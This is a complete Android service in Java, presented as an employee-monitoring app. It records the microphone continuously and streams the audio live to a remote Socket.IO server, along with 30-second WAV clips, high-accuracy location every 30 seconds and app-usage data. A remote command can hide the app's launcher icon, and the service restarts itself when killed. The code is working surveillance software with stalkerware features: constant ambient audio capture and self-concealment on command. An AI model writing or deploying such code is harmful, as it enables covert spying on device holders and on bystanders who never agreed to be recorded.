package com.company.monitor.services;

import android.app.*;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.*;
import android.util.Log;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import com.company.monitor.R;
import com.company.monitor.utils.PreferenceManager;
import com.google.android.gms.location.*;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONObject;

import java.io.*;
import java.net.URI;
import java.util.*;

public class MonitoringService extends Service {

    private static final String TAG = "MonitoringService";
    private static final String CHANNEL_ID = "MonitoringChannel";
    private static final int NOTIFICATION_ID = 1001;

    // Intervals
    private static final long LOCATION_INTERVAL_MS     = 30_000;  // 30 sec
    private static final long APP_USAGE_INTERVAL_MS    = 60_000;  // 1 min
    private static final long VOICE_SEGMENT_MS         = 30_000;  // 30 sec voice clips

    private Socket socket;
    private FusedLocationProviderClient fusedLocationClient;
    private LocationCallback locationCallback;
    private Handler mainHandler;
    private PreferenceManager prefManager;

    private String employeeId;
    private String employeeName;
    private String serverUrl;

    // Audio streaming
    private AudioRecord audioRecord;
    private volatile boolean isStreaming = false;
    private Thread audioThread;
    private static final int SAMPLE_RATE = 16000;
    private static final int AUDIO_CHANNELS = AudioFormat.CHANNEL_IN_MONO;
    private static final int AUDIO_ENCODING = AudioFormat.ENCODING_PCM_16BIT;

    // App usage tracking
    private final Handler usageHandler = new Handler(Looper.getMainLooper());
    private final Runnable usageRunnable = new Runnable() {
        @Override
        public void run() {
            trackAppUsage();
            usageHandler.postDelayed(this, APP_USAGE_INTERVAL_MS);
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        prefManager = new PreferenceManager(this);
        mainHandler  = new Handler(Looper.getMainLooper());
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);

        employeeId   = prefManager.getEmployeeId();
        employeeName = prefManager.getEmployeeName();
        serverUrl    = prefManager.getServerUrl();

        createNotificationChannel();
        startForeground(NOTIFICATION_ID, buildNotification());

        connectSocket();
        startLocationTracking();
        startAudioStreaming();
        usageHandler.post(usageRunnable);
    }

    // ─────────────────── SOCKET.IO ───────────────────

    private void connectSocket() {
        try {
            IO.Options options = IO.Options.builder()
                .setReconnection(true)
                .setReconnectionAttempts(Integer.MAX_VALUE)
                .setReconnectionDelay(3000)
                .build();

            socket = IO.socket(URI.create(serverUrl), options);

            socket.on(Socket.EVENT_CONNECT, args -> {
                Log.d(TAG, "Socket connected");
                try {
                    JSONObject info = new JSONObject();
                    info.put("employeeId",   employeeId);
                    info.put("employeeName", employeeName);
                    info.put("device",       Build.MODEL);
                    info.put("androidVersion", Build.VERSION.RELEASE);
                    socket.emit("employee_register", info);
                } catch (Exception e) {
                    Log.e(TAG, "Register error", e);
                }
            });

            socket.on(Socket.EVENT_DISCONNECT, args ->
                Log.w(TAG, "Socket disconnected – will reconnect"));

            // Listen for hide/unhide commands from admin panel
            socket.on("command_hide_app", args -> {
                try {
                    JSONObject cmd = (JSONObject) args[0];
                    String targetId = cmd.getString("employeeId");
                    if (targetId.equals(employeeId)) {
                        boolean hide = cmd.getBoolean("hide");
                        setAppHidden(hide);
                        Log.d(TAG, "App visibility changed: hidden=" + hide);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Hide command error", e);
                }
            });

            socket.connect();
        } catch (Exception e) {
            Log.e(TAG, "Socket init error", e);
        }
    }

    private void emitEvent(String eventName, JSONObject data) {
        if (socket != null && socket.connected()) {
            socket.emit(eventName, data);
        }
    }

    // ─────────────────── APP HIDE/UNHIDE ───────────────────

    private void setAppHidden(boolean hide) {
        try {
            PackageManager pm = getPackageManager();
            ComponentName launcher = new ComponentName(this, "com.company.monitor.MainActivity");
            int newState = hide
                ? PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                : PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
            pm.setComponentEnabledSetting(launcher, newState, PackageManager.DONT_KILL_APP);
            prefManager.setAppHidden(hide);
            Log.d(TAG, "App icon " + (hide ? "HIDDEN" : "VISIBLE"));

            // Notify server of state change
            try {
                JSONObject ack = new JSONObject();
                ack.put("employeeId", employeeId);
                ack.put("hidden", hide);
                emitEvent("app_hidden_status", ack);
            } catch (Exception ignored) {}
        } catch (Exception e) {
            Log.e(TAG, "Failed to change app visibility", e);
        }
    }

    // ─────────────────── LOCATION ───────────────────

    private void startLocationTracking() {
        LocationRequest req = new LocationRequest.Builder(LOCATION_INTERVAL_MS)
            .setPriority(Priority.PRIORITY_HIGH_ACCURACY)
            .setMinUpdateIntervalMillis(15_000)
            .build();

        locationCallback = new LocationCallback() {
            @Override
            public void onLocationResult(@NonNull LocationResult result) {
                Location loc = result.getLastLocation();
                if (loc == null) return;
                try {
                    JSONObject data = new JSONObject();
                    data.put("employeeId",   employeeId);
                    data.put("employeeName", employeeName);
                    data.put("latitude",     loc.getLatitude());
                    data.put("longitude",    loc.getLongitude());
                    data.put("accuracy",     loc.getAccuracy());
                    data.put("speed",        loc.getSpeed());
                    data.put("timestamp",    System.currentTimeMillis());
                    emitEvent("location_update", data);
                } catch (Exception e) {
                    Log.e(TAG, "Location emit error", e);
                }
            }
        };

        try {
            fusedLocationClient.requestLocationUpdates(req, locationCallback, Looper.getMainLooper());
        } catch (SecurityException e) {
            Log.e(TAG, "Location permission missing", e);
        }
    }

    // ─────────────────── AUDIO STREAMING ───────────────────

    private void startAudioStreaming() {
        int bufferSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, AUDIO_CHANNELS, AUDIO_ENCODING);
        bufferSize = Math.max(bufferSize, SAMPLE_RATE * 2); // at least 1 second

        try {
            audioRecord = new AudioRecord(
                MediaRecorder.AudioSource.MIC,
                SAMPLE_RATE, AUDIO_CHANNELS, AUDIO_ENCODING, bufferSize);
        } catch (SecurityException e) {
            Log.e(TAG, "Mic permission missing", e);
            return;
        }

        if (audioRecord.getState() != AudioRecord.STATE_INITIALIZED) {
            Log.e(TAG, "AudioRecord failed to initialize");
            return;
        }

        audioRecord.startRecording();
        isStreaming = true;

        final int chunkSize = SAMPLE_RATE; // 500ms of 16-bit mono = 16000 bytes

        audioThread = new Thread(() -> {
            byte[] buffer = new byte[chunkSize];
            ByteArrayOutputStream fileBuffer = new ByteArrayOutputStream();
            long fileStartTime = System.currentTimeMillis();

            while (isStreaming) {
                int read = audioRecord.read(buffer, 0, buffer.length);
                if (read > 0) {
                    // Stream chunk to server in real-time
                    try {
                        String base64 = android.util.Base64.encodeToString(
                            buffer, 0, read, android.util.Base64.NO_WRAP);
                        JSONObject data = new JSONObject();
                        data.put("employeeId", employeeId);
                        data.put("employeeName", employeeName);
                        data.put("audioChunk", base64);
                        data.put("sampleRate", SAMPLE_RATE);
                        data.put("timestamp", System.currentTimeMillis());
                        emitEvent("audio_stream", data);
                    } catch (Exception e) {
                        Log.e(TAG, "Stream emit error", e);
                    }

                    // Also buffer for periodic file save
                    fileBuffer.write(buffer, 0, read);

                    // Every VOICE_SEGMENT_MS, save as WAV and send as voice_data
                    if (System.currentTimeMillis() - fileStartTime >= VOICE_SEGMENT_MS) {
                        byte[] pcmData = fileBuffer.toByteArray();
                        fileBuffer.reset();
                        long ts = fileStartTime;
                        fileStartTime = System.currentTimeMillis();
                        saveAndSendWav(pcmData, ts);
                    }
                }
            }

            // Save remaining data
            if (fileBuffer.size() > 0) {
                saveAndSendWav(fileBuffer.toByteArray(), fileStartTime);
            }
        }, "AudioStreamThread");
        audioThread.start();
        Log.d(TAG, "Audio streaming started");
    }

    private void stopAudioStreaming() {
        isStreaming = false;
        if (audioThread != null) {
            try { audioThread.join(3000); } catch (InterruptedException ignored) {}
            audioThread = null;
        }
        if (audioRecord != null) {
            try {
                audioRecord.stop();
                audioRecord.release();
            } catch (Exception ignored) {}
            audioRecord = null;
        }
        Log.d(TAG, "Audio streaming stopped");
    }

    private void saveAndSendWav(byte[] pcmData, long timestamp) {
        new Thread(() -> {
            try {
                String filename = "voice_" + employeeId + "_" + timestamp + ".wav";
                File file = new File(getCacheDir(), filename);

                try (FileOutputStream fos = new FileOutputStream(file)) {
                    writeWavHeader(fos, pcmData.length);
                    fos.write(pcmData);
                }

                // Read back and send
                byte[] fileBytes = readFileBytes(file);
                String base64 = android.util.Base64.encodeToString(fileBytes, android.util.Base64.DEFAULT);

                JSONObject data = new JSONObject();
                data.put("employeeId",   employeeId);
                data.put("employeeName", employeeName);
                data.put("audioData",    base64);
                data.put("filename",     filename);
                data.put("timestamp",    timestamp);
                data.put("durationMs",   VOICE_SEGMENT_MS);
                emitEvent("voice_data", data);

                file.delete();
                Log.d(TAG, "Voice file sent: " + filename);
            } catch (Exception e) {
                Log.e(TAG, "Save WAV error", e);
            }
        }).start();
    }

    private void writeWavHeader(OutputStream out, int pcmLength) throws IOException {
        int byteRate = SAMPLE_RATE * 2; // 16-bit mono
        out.write("RIFF".getBytes());
        writeInt(out, 36 + pcmLength);
        out.write("WAVE".getBytes());
        out.write("fmt ".getBytes());
        writeInt(out, 16);
        writeShort(out, (short) 1); // PCM
        writeShort(out, (short) 1); // mono
        writeInt(out, SAMPLE_RATE);
        writeInt(out, byteRate);
        writeShort(out, (short) 2); // block align
        writeShort(out, (short) 16); // bits per sample
        out.write("data".getBytes());
        writeInt(out, pcmLength);
    }

    private void writeInt(OutputStream out, int val) throws IOException {
        out.write(val & 0xFF);
        out.write((val >> 8) & 0xFF);
        out.write((val >> 16) & 0xFF);
        out.write((val >> 24) & 0xFF);
    }

    private void writeShort(OutputStream out, short val) throws IOException {
        out.write(val & 0xFF);
        out.write((val >> 8) & 0xFF);
    }

    private byte[] readFileBytes(File file) throws IOException {
        try (FileInputStream fis = new FileInputStream(file);
             ByteArrayOutputStream bos = new ByteArrayOutputStream()) {
            byte[] buf = new byte[4096];
            int n;
            while ((n = fis.read(buf)) != -1) bos.write(buf, 0, n);
            return bos.toByteArray();
        }
    }

    // ─────────────────── APP USAGE ───────────────────

    private void trackAppUsage() {
        try {
            UsageStatsManager usm = (UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);
            long now   = System.currentTimeMillis();
            long start = now - APP_USAGE_INTERVAL_MS;

            List<UsageStats> stats = usm.queryUsageStats(
                UsageStatsManager.INTERVAL_BEST, start, now);

            if (stats == null || stats.isEmpty()) return;

            for (UsageStats us : stats) {
                if (us.getTotalTimeInForeground() <= 0) continue;
                try {
                    JSONObject data = new JSONObject();
                    data.put("employeeId",    employeeId);
                    data.put("employeeName",  employeeName);
                    data.put("packageName",   us.getPackageName());
                    data.put("appName",       getAppName(us.getPackageName()));
                    data.put("usageMs",       us.getTotalTimeInForeground());
                    data.put("lastUsed",      us.getLastTimeUsed());
                    data.put("timestamp",     now);
                    emitEvent("app_usage", data);
                } catch (Exception e) {
                    Log.e(TAG, "App usage emit error", e);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "App usage tracking error", e);
        }
    }

    private String getAppName(String packageName) {
        try {
            return getPackageManager()
                .getApplicationLabel(
                    getPackageManager().getApplicationInfo(packageName, 0))
                .toString();
        } catch (Exception e) {
            return packageName;
        }
    }

    // ─────────────────── NOTIFICATION ───────────────────

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Employee Monitoring",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Company device monitoring service");
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Company Monitoring Active")
            .setContentText("This device is being monitored as per employment agreement.")
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build();
    }

    // ─────────────────── LIFECYCLE ───────────────────

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // restart if killed
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (locationCallback != null) fusedLocationClient.removeLocationUpdates(locationCallback);
        usageHandler.removeCallbacks(usageRunnable);
        stopAudioStreaming();
        if (socket != null) socket.disconnect();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
